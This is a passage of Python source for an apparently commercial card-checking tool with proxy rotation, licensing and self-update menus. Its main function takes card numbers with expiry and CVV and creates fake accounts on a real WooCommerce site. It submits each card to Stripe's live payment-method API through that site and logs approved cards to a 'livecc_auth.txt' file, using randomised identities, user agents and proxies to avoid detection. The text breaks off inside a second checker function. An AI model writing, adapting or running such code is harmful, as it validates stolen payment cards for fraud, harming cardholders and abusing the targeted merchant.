    print(f"  {LCYAN}└{'─' * INNER}┘{RESET_ALL}")
    print()

def _print_menu_item(num: str, title: str, desc: str='', active: bool=True, color: str=CYAN) -> None:
    status = f'{LCYAN}[{num}]{RESET_ALL}'
    if not active:
        status = f'{LRED}[{num}]{RESET_ALL}'
        title = f'{DIM}{title}{RESET_ALL}'
    elif num in ['07']:
        status = f'{LYELLOW}[{num}]{RESET_ALL}'
    if desc:
        print(f'  {status} {title:<30} {GRAY}{desc}{RESET_ALL}')
    else:
        print(f'  {status} {title}')

def show_settings() -> None:
    while True:
        _print_header('SETTINGS', 'Configure proxy, license, and system')
        _print_status_bar()
        print(f"  {LCYAN}┌{'─' * 60}┐{RESET_ALL}")
        _print_menu_item(num='01', title='Set Proxy', desc='Configure single proxy or rotation')
        _print_menu_item(num='02', title='Remove Proxy', desc='Clear proxy and use direct connection')
        _print_menu_item(num='03', title='Check Update', desc='Check for git updates and pull')
        _print_menu_item(num='04', title='Verify License', desc='Re-verify license status')
        _print_menu_item(num='00', title='Back to Main Menu', desc='')
        print(f"  {LCYAN}└{'─' * 60}┘{RESET_ALL}")
        print()
        choice = input(f'  {LCYAN}›{RESET_ALL} Select option > ').strip()
        if choice == '00' or choice == '0':
            return
        elif choice == '01' or choice == '1':
            _show_proxy_setup()
        elif choice == '02' or choice == '2':
            _remove_proxy()
        elif choice == '03' or choice == '3':
            _check_git_update()
        elif choice == '04' or choice == '4':
            _verify_license()
        else:
            print(f'\n  {LRED}✗{RESET_ALL} Invalid option')
            time.sleep(1)

def _show_proxy_setup() -> None:
    _print_header('SET PROXY', 'Configure proxy for all requests')
    proxy_status = _proxy_manager.get_status()
    if proxy_status['active']:
        print(f"  {LGREEN}✓{RESET_ALL} Current: {proxy_status['proxy']}")
        print(f"  {GRAY}  Type: {proxy_status['type']}{RESET_ALL}")
        print()
    PROXY_TYPES = [('static', 'Static IP'), ('proxy_rotation', 'Proxy Rotation'), ('data_impulse', 'Data Impulse'), ('credentials', 'Credentials'), ('proxy_share', 'Proxy Share')]
    print(f'  {LCYAN}Proxy Type:{RESET_ALL}')
    for i, (val, label) in enumerate(PROXY_TYPES, 1):
        mark = ' ◂' if val == proxy_status['type'] else ''
        print(f'    {LCYAN}[{i}]{RESET_ALL} {label}{mark}')
    print()
    type_choice = input(f'  {LCYAN}›{RESET_ALL} Select type (1-5) > ').strip()
    type_map = {str(i): v[0] for i, v in enumerate(PROXY_TYPES, 1)}
    ptype = type_map.get(type_choice, 'static')
    print()
    print(f'  {LCYAN}Supported formats:{RESET_ALL}')
    print(f'  {GRAY}  host:port{RESET_ALL}')
    print(f'  {GRAY}  user:pass@host:port{RESET_ALL}')
    print(f'  {GRAY}  host:port:user:pass{RESET_ALL}')
    print(f'  {GRAY}  user:pass:host:port{RESET_ALL}')
    print(f'  {GRAY}  scheme://host:port{RESET_ALL}')
    print(f'  {GRAY}  scheme://user:pass@host:port{RESET_ALL}')
    print(f'  {GRAY}  Protocols: http, https, socks4, socks5, socks5h{RESET_ALL}')
    print(f'  {GRAY}  Supports special chars in password (plain or URL-encoded){RESET_ALL}')
    print()
    proxy_input = input(f'  {LCYAN}›{RESET_ALL} Paste proxy(s) > ').strip()
    if not proxy_input:
        print(f'\n  {LRED}✗{RESET_ALL} No proxy entered')
        time.sleep(1)
        return
    raw_proxies = [p.strip() for p in proxy_input.splitlines() if p.strip()]
    filtered_proxies = []
    for p in raw_proxies:
        if p.lower() in ['proxy.txt', 'proxies.txt', 'proxy_list.txt']:
            continue
        filtered_proxies.append(p)
    if not filtered_proxies:
        print(f'\n  {LRED}✗{RESET_ALL} No valid proxy entered - keeping direct connection')
        _proxy_manager.remove_proxy()
        time.sleep(1.5)
        return
    if len(filtered_proxies) > 1:
        normalized_list = []
        invalid_count = 0
        for p in filtered_proxies:
            normalized = _normalize_proxy(p)
            if normalized:
                normalized_list.append(normalized)
            else:
                invalid_count += 1
                display = p[:50] + '...' if len(p) > 50 else p
                print(f'  {LYELLOW}⚠{RESET_ALL} Invalid format skipped: {display}')
        if not normalized_list:
            print(f'\n  {LRED}✗{RESET_ALL} All proxies invalid - keeping direct connection')
            _proxy_manager.remove_proxy()
            time.sleep(1.5)
            return
        success = _proxy_manager.set_proxy(proxy=normalized_list[0], ptype='proxy_rotation', proxy_list=normalized_list)
        if success:
            print()
            print(f'  {LGREEN}✓{RESET_ALL} Loaded {len(normalized_list)} proxies ({invalid_count} skipped)')
            print(f'  {GRAY}  Type: proxy_rotation (round-robin){RESET_ALL}')
            print(f'  {GRAY}  All sessions synchronized{RESET_ALL}')
        else:
            print(f'\n  {LRED}✗{RESET_ALL} Proxy validation failed - keeping direct connection')
            _proxy_manager.remove_proxy()
    else:
        proxy = filtered_proxies[0]
        normalized = _normalize_proxy(proxy)
        if not normalized:
            print(f'\n  {LRED}✗{RESET_ALL} Invalid proxy format - keeping direct connection')
            _proxy_manager.remove_proxy()
            time.sleep(1.5)
            return
        success = _proxy_manager.set_proxy(proxy=normalized, ptype=ptype)
        if success:
            print()
            print(f'  {LGREEN}✓{RESET_ALL} Proxy configured')
            print(f'  {GRAY}  {normalized}{RESET_ALL}')
            print(f'  {GRAY}  Type: {ptype}{RESET_ALL}')
        else:
            print(f'\n  {LRED}✗{RESET_ALL} Proxy validation failed - keeping direct connection')
            _proxy_manager.remove_proxy()
            time.sleep(1.5)
            return
    print()
    input(f'  {LBLACK}[Press ENTER]{RESET_ALL}')

def _remove_proxy() -> None:
    _print_header('REMOVE PROXY', 'Clear proxy and use direct connection')
    proxy_status = _proxy_manager.get_status()
    if not proxy_status['active']:
        print(f'\n  {LCYAN}ℹ{RESET_ALL} Proxy is already inactive')
        print(f'  {GRAY}  Using direct connection{RESET_ALL}')
    else:
        print(f'  {LRED}⚠{RESET_ALL} This will remove:')
        print(f"  {GRAY}  • Current proxy: {proxy_status['proxy'][:50]}...{RESET_ALL}")
        print(f"  {GRAY}  • Type: {proxy_status['type']}{RESET_ALL}")
        print()
        confirm = input(f'  {LRED}›{RESET_ALL} Confirm removal? (y/N) > ').strip().lower()
        if confirm == 'y':
            _proxy_manager.remove_proxy()
            print()
            print(f'  {LGREEN}✓{RESET_ALL} Proxy removed')
            print(f'  {GRAY}  All sessions switched to direct connection{RESET_ALL}')
        else:
            print(f'\n  {LCYAN}ℹ{RESET_ALL} Cancelled')
    print()
    input(f'  {LBLACK}[Press ENTER]{RESET_ALL}')

def _check_git_update() -> None:
    _print_header('CHECK UPDATE', 'Auto pulling updates from repository...')
    REPO_URL = 'https://github.com/KianSantang777/MeduzaV3.git'

    def on_invalid(event_type: str, title: str, message: str) -> None:
        print(f'\n  {LRED}[!] LICENSE INVALID: {title}{RESET_ALL}')
        print(f'  {LYELLOW}   {message}{RESET_ALL}')
        LicenseClient.open_telegram_support()

    def on_status(info: LicenseInfo) -> None:
        pass
    if not LicenseManager.is_authenticated():
        print(f'\n  {LCYAN}[*] Authenticating license first...{RESET_ALL}')
        if not LicenseManager.authenticate(verify_url=LICENSE_VERIFY_URL, socket_url=LICENSE_SOCKET_URL, label=LICENSE_LABEL, on_invalid=on_invalid, on_status=on_status, auto_protection=True):
            print(f'\n  {LRED}[!] License authentication required for updates{RESET_ALL}')
            input(f'\n  {LBLACK}[Press ENTER]{RESET_ALL}')
        return
    info = LicenseManager.get()
    if info:
        print(f'  {LGREEN}[+] License valid: {info.name}{RESET_ALL}')
        print(f'  {LCYAN}[+] Expires: {info.expiry_display}{RESET_ALL}')
        print()
    print(f'  {LCYAN}[*] Repository: {REPO_URL}{RESET_ALL}')
    print()
    is_git_repo = False
    try:
        subprocess.run(['git', 'rev-parse', '--is-inside-work-tree'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True, timeout=10)
        is_git_repo = True
    except Exception:
        pass
    if is_git_repo:
        print(f'  {LCYAN}[*] Git repository detected{RESET_ALL}')
        try:
            remote_url = subprocess.check_output(['git', 'remote', 'get-url', 'origin'], stderr=subprocess.DEVNULL, timeout=10).strip().decode('utf-8', errors='replace')
            print(f'  {GRAY}  Current remote: {remote_url}{RESET_ALL}')
            if REPO_URL not in remote_url and 'KianSantang777' not in remote_url:
                print(f'\n  {LYELLOW}[!] Different repository detected{RESET_ALL}')
                print(f'  {GRAY}  Setting up remote for: {REPO_URL}{RESET_ALL}')
                print()
                try:
                    subprocess.run(['git', 'remote', 'set-url', 'origin', REPO_URL], check=True, timeout=10)
                    print(f'  {LGREEN}[+] Remote updated{RESET_ALL}')
                except Exception as e:
                    print(f'  {LRED}[!] Failed to update remote: {e}{RESET_ALL}')
        except Exception:
            print(f'\n  {LCYAN}[*] Setting up git remote...{RESET_ALL}')
            try:
                subprocess.run(['git', 'remote', 'add', 'origin', REPO_URL], check=True, timeout=10)
                print(f'  {LGREEN}[+] Remote added: {REPO_URL}{RESET_ALL}')
            except Exception as e:
                print(f'  {LRED}[!] Failed to add remote: {e}{RESET_ALL}')
        print()
        print(f'  {LCYAN}[*] Fetching latest updates...{RESET_ALL}')
        try:
            subprocess.run(['git', 'fetch', 'origin'], stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, timeout=30)
        except Exception as e:
            print(f'  {LYELLOW}[!] Fetch failed, trying pull anyway...{RESET_ALL}')
        try:
            local = subprocess.check_output(['git', 'rev-parse', 'HEAD'], stderr=subprocess.DEVNULL, timeout=15).strip().decode('utf-8', errors='replace')
        except Exception:
            local = 'unknown'
        detected_branch = None
        for branch in ['main', 'master']:
            try:
                subprocess.check_output(['git', 'rev-parse', f'origin/{branch}'], stderr=subprocess.DEVNULL, timeout=15)
                detected_branch = branch
                print(f'  {GRAY}  Detected branch: {branch}{RESET_ALL}')
                break
            except Exception:
                continue
        if detected_branch is None:
            print(f'  {LRED}[!] Could not detect branch (main/master) from remote{RESET_ALL}')
            input(f'\n  {LBLACK}[Press ENTER]{RESET_ALL}')
            return
        try:
            remote = subprocess.check_output(['git', 'rev-parse', f'origin/{detected_branch}'], stderr=subprocess.DEVNULL, timeout=15).strip().decode('utf-8', errors='replace')
        except Exception:
            remote = local
        print(f'  {GRAY}  Local:  {local[:7]}{RESET_ALL}')
        print(f'  {GRAY}  Remote: {remote[:7]}{RESET_ALL}')
        print()
        if local == remote:
            print(f'  {LGREEN}[=] System already up to date!{RESET_ALL}')
            print(f'  {GRAY}  No updates available.{RESET_ALL}')
        else:
            print(f'  {LCYAN}[i] Update available!{RESET_ALL}')
            print(f'  {GRAY}  Pulling {local[:7]} → {remote[:7]}{RESET_ALL}')
            print()
            print(f'  {LCYAN}[*] Auto pulling updates...{RESET_ALL}')
            try:
                result = subprocess.run(['git', 'pull', 'origin', detected_branch, '--ff-only'], capture_output=True, text=True, timeout=60)
                if result.returncode == 0:
                    print(f'\n  {LGREEN}[+] Update applied successfully!{RESET_ALL}')
                    if result.stdout.strip():
                        print(f'  {GRAY}  {result.stdout.strip()}{RESET_ALL}')
                    print(f'  {LCYAN}[>] Restarting application...{RESET_ALL}')
                    time.sleep(1)
                    os.execv(sys.executable, [sys.executable] + sys.argv)
                else:
                    print(f'\n  {LRED}[!] Update failed{RESET_ALL}')
                    if result.stderr:
                        print(f'  {LRED}   {result.stderr.strip()}{RESET_ALL}')
                    print(f'  {LYELLOW}[!] Try manually: git pull origin {detected_branch}{RESET_ALL}')
            except subprocess.TimeoutExpired:
                print(f'\n  {LRED}[!] Update timed out{RESET_ALL}')
            except Exception as e:
                print(f'\n  {LRED}[!] Update failed: {e}{RESET_ALL}')
    else:
        print(f'  {LCYAN}[*] Not a git repository - cloning...{RESET_ALL}')
        print(f'  {GRAY}  Source: {REPO_URL}{RESET_ALL}')
        print(f'  {GRAY}  Target: {BASE_DIR}{RESET_ALL}')
        print()
        confirm = input(f'  {LCYAN}›{RESET_ALL} Clone repository here? (y/N) > ').strip().lower()
        if confirm == 'y':
            print(f'\n  {LCYAN}[*] Cloning...{RESET_ALL}')
            try:
                result = subprocess.run(['git', 'clone', REPO_URL, '.'], capture_output=True, text=True, timeout=120)
                if result.returncode == 0:
                    print(f'\n  {LGREEN}[+] Repository cloned successfully!{RESET_ALL}')
                    print(f'  {LCYAN}[>] Restarting application...{RESET_ALL}')
                    time.sleep(1)
                    os.execv(sys.executable, [sys.executable] + sys.argv)
                else:
                    print(f'\n  {LRED}[!] Clone failed{RESET_ALL}')
                    if result.stderr:
                        print(f'  {LRED}   {result.stderr.strip()}{RESET_ALL}')
            except Exception as e:
                print(f'\n  {LRED}[!] Clone failed: {e}{RESET_ALL}')
        else:
            print(f'\n  {LCYAN}ℹ{RESET_ALL} Cancelled')
    input(f'\n  {LBLACK}[Press ENTER]{RESET_ALL}')

def _verify_license() -> None:
    _print_header('Bypass EZ', 'License verification')
    client = LicenseManager.get_client()
    info = LicenseManager.get()
    if client and info:
        print(f'  {LGREEN}[+] Current license: {info.name}{RESET_ALL}')
        print(f'  {LCYAN}[+] Label: {info.label}{RESET_ALL}')
        print(f'  {LCYAN}[+] Status: {info.status.upper()}{RESET_ALL}')
        print(f'  {LCYAN}[+] Expires: {info.expiry_display}{RESET_ALL}')
        print(f'  {LCYAN}[+] Devices: {info.device_count}/{info.max_devices}{RESET_ALL}')
        print(f"  {LCYAN}[+] Socket: {('Connected' if client.is_authenticated() else 'Disconnected')}{RESET_ALL}")
        print()
        print(f"  {LCYAN}┌{'─' * 60}┐{RESET_ALL}")
        print(f'  {LCYAN}│{RESET_ALL}  [1] Re-verify license')
        print(f'  {LCYAN}│{RESET_ALL}  [2] Clear license & re-authenticate')
        print(f'  {LCYAN}│{RESET_ALL}  [0] Back')
        print(f"  {LCYAN}└{'─' * 60}┘{RESET_ALL}")
        print()
        choice = input(f'  {LCYAN}›{RESET_ALL} Select option > ').strip()
        if choice == '1':

            def on_invalid(event_type: str, title: str, message: str) -> None:
                print(f'\n  {LRED}[!] LICENSE INVALID: {title}{RESET_ALL}')
                print(f'  {LYELLOW}   {message}{RESET_ALL}')
                LicenseClient.open_telegram_support()

            def on_status(info: LicenseInfo) -> None:
                print(f'\r  {LGREEN}[*] Status OK: {info.name} ({info.device_count}/{info.max_devices} devices)   {RESET_ALL}', end='', flush=True)
            if LicenseManager.check_status():
                print(f'\n  {LGREEN}[+] License verified successfully{RESET_ALL}')
            else:
                print(f'\n  {LRED}[!] License verification failed{RESET_ALL}')
        elif choice == '2':
            LicenseManager.logout()
            print(f'\n  {LYELLOW}[!] License cleared{RESET_ALL}')

            def on_invalid(event_type: str, title: str, message: str) -> None:
                print(f'\n  {LRED}[!] LICENSE INVALID: {title}{RESET_ALL}')
                print(f'  {LYELLOW}   {message}{RESET_ALL}')
                LicenseClient.open_telegram_support()

            def on_status(info: LicenseInfo) -> None:
                pass
            print(f'\n  {LCYAN}[*] Re-authenticating...{RESET_ALL}')
            if not LicenseManager.authenticate(verify_url=LICENSE_VERIFY_URL, socket_url=LICENSE_SOCKET_URL, label=LICENSE_LABEL, on_invalid=on_invalid, on_status=on_status, auto_protection=True):
                print(f'\n  {LRED}[!] Authentication failed{RESET_ALL}')
                LicenseClient.open_telegram_support()
            else:
                print(f'\n  {LGREEN}[+] Authentication successful{RESET_ALL}')
    else:
        print(f'  {LYELLOW}[!] No license found{RESET_ALL}')
        print()

        def on_invalid(event_type: str, title: str, message: str) -> None:
            print(f'\n  {LRED}[!] LICENSE INVALID: {title}{RESET_ALL}')
            print(f'  {LYELLOW}   {message}{RESET_ALL}')
            LicenseClient.open_telegram_support()

        def on_status(info: LicenseInfo) -> None:
            pass
        print(f'  {LCYAN}[*] Authenticating...{RESET_ALL}')
        if not LicenseManager.authenticate(verify_url=LICENSE_VERIFY_URL, socket_url=LICENSE_SOCKET_URL, label=LICENSE_LABEL, on_invalid=on_invalid, on_status=on_status, auto_protection=True):
            print(f'\n  {LRED}[!] Authentication failed{RESET_ALL}')
            LicenseClient.open_telegram_support()
        else:
            print(f'\n  {LGREEN}[+] Authentication successful{RESET_ALL}')
            info = LicenseManager.get()
            if info:
                print(f'  {LCYAN}[+] License: {info.name}{RESET_ALL}')
                print(f'  {LCYAN}[+] Expires: {info.expiry_display}{RESET_ALL}')
    input(f'\n  {LBLACK}[Press ENTER]{RESET_ALL}')

def set_proxy() -> None:
    show_settings()

def log_line(text):
    with print_lock:
        sys.stdout.write('\r\x1b[K')
        print(text, flush=True)
        sys.stdout.flush()
TIMEOUT = 35
_AUTO_UPDATE_TIMEOUT = 15
_AUTO_UPDATE_RETRIES = 2
_AUTO_SPINNER_INTERVAL = 0.08

def _spinner_thread(msg: str, stop_event: threading.Event, color: str=Fore.CYAN, clear: bool=True) -> None:
    frames = ['|', '/', '-', '\\']
    i = 0
    prefix = f'{color}[*]{Style.RESET_ALL} '
    total_len = len(prefix) + len(msg)
    try:
        import sys as _sys
        while not stop_event.wait(_AUTO_SPINNER_INTERVAL):
            _sys.stdout.write(f'\r{prefix}{frames[i % 4]} {msg}{Style.RESET_ALL}')
            _sys.stdout.flush()
            i += 1
    except Exception:
        pass
    finally:
        if clear:
            try:
                _sys.stdout.write('\r' + ' ' * (total_len + 8) + '\r')
                _sys.stdout.flush()
            except Exception:
                pass

def _git_exec(args: list, timeout: int=_AUTO_UPDATE_TIMEOUT) -> Optional[bytes]:
    try:
        result = subprocess.run(['git'] + args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True, timeout=timeout)
        return result.stdout
    except subprocess.TimeoutExpired:
        _log('[!] Git command timed out', Fore.RED)
        return None
    except subprocess.CalledProcessError as e:
        _log(f'[!] Git error: {e}', Fore.RED)
        return None
    except FileNotFoundError:
        _log('[!] Git executable not found', Fore.RED)
        return None
    except Exception:
        return None

def _log(msg: str, color: str=Fore.CYAN, prefix: str='[*]') -> None:
    try:
        print(f'{color}{prefix} {msg}{Style.RESET_ALL}')
    except Exception:
        print(f'{prefix} {msg}')

def auto_update_and_restart(retries: int=_AUTO_UPDATE_RETRIES, timeout: int=_AUTO_UPDATE_TIMEOUT) -> bool:
    try:
        subprocess.run(['git', 'rev-parse', '--is-inside-work-tree'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True, timeout=10)
    except Exception:
        _log('Repository not detected — skipping update', Fore.YELLOW, '[!]')
        return False
    for attempt in range(1, retries + 1):
        if attempt > 1:
            _log(f'Retry {attempt}/{retries}...', Fore.YELLOW, '[~]')
        fetch_ok = _git_exec(['fetch', '--tags', '--force'], timeout=timeout)
        if fetch_ok is None:
            if attempt == retries:
                _log('Failed to fetch upstream after all retries', Fore.RED, '[x]')
                return False
            time.sleep(1)
            continue
        break
    local: Optional[str] = None
    remote: Optional[str] = None
    try:
        raw_local = subprocess.check_output(['git', 'rev-parse', 'HEAD'], stderr=subprocess.DEVNULL, timeout=timeout)
        local = raw_local.strip().decode('utf-8', errors='replace')
    except Exception:
        _log('Failed to read local commit hash', Fore.RED, '[x]')
        return False
    try:
        raw_remote = subprocess.check_output(['git', 'rev-parse', '@{u}'], stderr=subprocess.DEVNULL, timeout=timeout)
        remote = raw_remote.strip().decode('utf-8', errors='replace')
    except subprocess.CalledProcessError:
        try:
            raw_remote = subprocess.check_output(['git', 'rev-parse', '--verify', '-q', 'origin/HEAD'], stderr=subprocess.DEVNULL, timeout=timeout)
            remote = raw_remote.strip().decode('utf-8', errors='replace')
        except Exception:
            _log('No upstream branch configured — cannot determine if update needed', Fore.YELLOW, '[!]')
            return False
    if local is None or remote is None:
        _log('Version comparison failed — hash is None', Fore.RED, '[x]')
        return False
    if local == remote:
        _log('System already up to date', Fore.GREEN, '[=]')
        return False
    _log(f'Update available: {local[:7]} → {remote[:7]}', Fore.CYAN, '[i]')
    stop_event = threading.Event()
    spinner = threading.Thread(target=_spinner_thread, args=('Applying updates…', stop_event), daemon=True)
    spinner.start()
    pull_ok = _git_exec(['pull', '--ff-only'], timeout=timeout)
    stop_event.set()
    spinner.join(timeout=3)
    if pull_ok is None:
        _log('Update process failed', Fore.RED, '[x]')
        return False
    _log('Update applied successfully', Fore.GREEN, '[+]')
    _log('Restarting process…', Fore.CYAN, '[>]')
    try:
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except OSError:
        try:
            subprocess.Popen([sys.executable] + sys.argv, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.5)
        except Exception:
            _log('Restart failed — please restart manually', Fore.RED, '[x]')
            return False
    sys.exit(0)
    return False

def flow1(card: str, proxy: Optional[str]=None) -> Optional[bool]:
    ses = requests.Session()
    _proxy_manager.apply_to_session(ses)
    fake = Faker('en_US')
    chars = string.ascii_letters + string.digits + string.punctuation
    password = ''.join((secrets.choice(chars) for _ in range(12)))
    if UserAgent:
        ua = UserAgent(platforms='mobile')
        useragents = ua.random
    else:
        useragents = random.choice(USA)
    guid, muid, sid, sessionuid = (str(uuid.uuid4()) for _ in range(4))
    current_proxy = _proxy_manager.get_current_proxy()
    fingerprintId = __import__('hashlib').sha256(f"{useragents}|{current_proxy or ''}".encode()).hexdigest()
    for attr in ('zipcode', 'postalcode', 'postal_code', 'postcode'):
        provider = getattr(fake, attr, None)
        if callable(provider):
            zipcode = provider()
            break
    firstname = fake.first_name()
    lastname = fake.last_name()
    email = f"{Faker().user_name().lower()}_{secrets.token_hex(4)}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'icloud.com', 'protonmail.com', 'live.com', 'msn.com', 'yahoo.co.id', 'yahoo.co.uk', 'yahoo.co.jp', 'live.uk', 'live.co.uk', 'live.ca', 'outlook.co.uk', 'zoho.com', 'zohomail.com', 'fastmail.com', 'pm.me', 'yandex.com', 'yandex.ru', 'mail.ru', 'gmx.com', 'gmx.de', 'web.de'])}"
    username = random.choice(string.ascii_lowercase) + ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
    today = datetime.now().strftime('%Y-%m-%d')
    today1 = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    for attempt in range(5):
        try:
            cc, mm, yy, cvv = card.split('|')
            mm = mm.zfill(2)
            yy = yy[-2:].zfill(2)
            cvv = cvv[:4]
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'no-cache', 'pragma': 'no-cache', 'priority': 'u=0, i', 'referer': 'https://www.google.com/', 'user-agent': useragents}
            response = ses.get('https://www.leadrugs.org/my-account-2/', headers=headers)
            txt = response.text
            register_nonce = gstr(txt, 'woocommerce-register-nonce" value="', '"')
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'no-cache', 'content-type': 'application/x-www-form-urlencoded', 'dnt': '1', 'origin': 'https://www.leadrugs.org', 'pragma': 'no-cache', 'priority': 'u=0, i', 'referer': 'https://www.leadrugs.org/my-account-2/', 'user-agent': useragents}
            data = {'email': email, 'woocommerce-register-nonce': register_nonce, '_wp_http_referer': '/my-account-2/', 'register': 'Register'}
            response = ses.post('https://www.leadrugs.org/my-account-2/', headers=headers, data=data)
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'no-cache', 'pragma': 'no-cache', 'priority': 'u=0, i', 'referer': 'https://www.leadrugs.org/my-account-2/', 'user-agent': useragents}
            response = ses.get('https://www.leadrugs.org/my-account/payment-methods/', headers=headers)
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'no-cache', 'pragma': 'no-cache', 'priority': 'u=0, i', 'referer': 'https://www.leadrugs.org/my-account/payment-methods/', 'user-agent': useragents}
            response = ses.get('https://www.leadrugs.org/my-account/add-payment-method/', headers=headers)
            txt2 = response.text
            createSetupNonce = gstr(txt2, '"createAndConfirmSetupIntentNonce":"', '"')
            post_data = {'type': 'card', 'card[number]': cc, 'card[cvc]': cvv, 'card[exp_year]': yy, 'card[exp_month]': mm, 'allow_redisplay': 'unspecified', 'billing_details[address][postal_code]': '06040', 'billing_details[address][country]': 'US', 'pasted_fields': 'number,cvc,zip', 'payment_user_agent': 'stripe.js/b0f5e7abe5; stripe-js-v3/b0f5e7abe5; payment-element; deferred-intent', 'referrer': 'https://www.leadrugs.org', 'time_on_page': '31243', 'client_attribution_metadata[client_session_id]': 'e662bffd-33a7-40c6-b848-1ab35b77a444', 'client_attribution_metadata[merchant_integration_source]': 'elements', 'client_attribution_metadata[merchant_integration_subtype]': 'payment-element', 'client_attribution_metadata[merchant_integration_version]': '2021', 'client_attribution_metadata[payment_intent_creation_flow]': 'deferred', 'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified', 'client_attribution_metadata[elements_session_id]': 'elements_session_1UG7OcXIttr', 'client_attribution_metadata[elements_session_config_id]': 'a9a714a3-be60-435f-9d35-82e376bef240', 'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment', 'guid': str(guid), 'muid': str(muid), 'sid': str(sid), 'key': 'pk_live_51F7SiwFtwybrkDmZSHr9VeOGKiYn15pA4mZV85xjUYGz95RiuuKNj4Nkzxtq2Ys38Z4lpeRDminAeJoRr1jka98B00ozaXFnPM'}
            response = ses.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=post_data)
            json1 = response.json()
            idpm = json1.get('id')
            if not idpm:
                message = json1.get('error', {}).get('message')
                log_line(f'    {LRED}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LRED}DECLINED {LWHITE}--> {LRED}{message}{RESET_ALL}')
                return False
            headers = {'accept': '*/*', 'accept-language': 'en-US,en;q=0.9,id;q=0.8', 'cache-control': 'no-cache', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'dnt': '1', 'origin': 'https://www.leadrugs.org', 'pragma': 'no-cache', 'priority': 'u=1, i', 'referer': 'https://www.leadrugs.org/my-account/add-payment-method/', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': useragents, 'x-requested-with': 'XMLHttpRequest'}
            data = {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': idpm, 'wc-stripe-payment-type': 'card', '_ajax_nonce': createSetupNonce}
            response = ses.post('https://www.leadrugs.org/wp-admin/admin-ajax.php', headers=headers, data=data)
            respon = response.text
            status = gstr(respon, '"status":"', '"')
            message = gstr(respon, '"message":"', '"')
            if status == 'succeeded':
                log_line(f'    {LGREEN}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LGREEN}APPROVED {LWHITE}--> {LGREEN}SUCCEEDED{RESET_ALL}')
                with open('livecc_auth.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{cc}|{mm}|{yy}|{cvv} -[{today1}] -> SUCCEEDED\n')
                    f.flush()
                return True
            elif status == 'requires_action':
                print(f'    {YELLOW}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {YELLOW}THREE3DS {LWHITE}--> {YELLOW}Card requires 3Ds action.{RESET_ALL}')
                return False
            elif message:
                log_line(f'    {LRED}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LRED}DECLINED {LWHITE}--> {LRED}{message}{RESET_ALL}')
                return False
            if attempt == 4:
                log_line(f'    {LRED}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LRED}MAXRETRY {LWHITE}--> {LRED}Maximum retry limit reached.{RESET_ALL}')
                return None
            log_line(f'    {LMAGENTA}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LMAGENTA}RETRY {LWHITE}--> {LMAGENTA}Site unavailable..{RESET_ALL}')
            time.sleep(random.uniform(4, 20))
            continue
        except ProxyError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except SSLError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (ConnectionError, Timeout, socket.timeout) as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except HTTPError as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except TooManyRedirects as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (ChunkedEncodingError, ContentDecodingError) as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        except (InvalidURL, InvalidSchema) as e:
            log_line(f'    {LMAGENTA}-->  {LWHITE}{cc}|{mm}|{yy}|{cvv} <-- {LMAGENTA}ERROR {LWHITE}--> {LMAGENTA}Invalid request URL.{RESET_ALL}')
            return None
        except RequestException as e:
            if not _handle_retry(cc, mm, yy, cvv, e, attempt):
                return None
            continue
        finally:
            ses.close()
        time.sleep(random.uniform(4, 20))
        continue

def nonvbv(card: str, proxy: Optional[str]=None) -> Optional[bool]:
    ses = requests.Session()
    _proxy_manager.apply_to_session(ses)
    fake = Faker('en_UK')
    chars = string.ascii_letters + string.digits + string.punctuation
    password = ''.join((secrets.choice(chars) for _ in range(12)))
    if UserAgent:
        ua = UserAgent(platforms='desktop')
        useragents = ua.random
    else:
        useragents = random.choice(USA)
    current_proxy = _proxy_manager.get_current_proxy()
    fingerprintId = __import__('hashlib').sha256(f"{useragents}|{current_proxy or ''}".encode()).hexdigest()
    firstname = fake.first_name()
    lastname = fake.last_name()
